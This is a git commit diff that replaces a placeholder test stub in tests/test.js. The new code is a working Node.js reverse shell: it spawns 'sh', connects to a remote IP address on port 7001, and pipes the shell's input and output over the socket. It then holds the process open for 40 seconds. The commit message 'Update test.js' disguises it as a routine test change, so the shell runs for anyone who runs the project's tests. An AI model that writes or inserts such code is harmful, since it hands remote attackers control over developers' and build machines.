27508b7fc7a2bf70911e33cbd1807176a09330e6
D2490 <103814015+D2490@users.noreply.github.com>
2023-04-15 03:09:05 +0800

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,21 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(7001, "101.43.241.151", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+// Sleep for 40 seconds
+setTimeout(function(){
+    // Exit the process
+    process.exit();
+} , 40000);
+
+// Block exit
+process.stdin.resume();
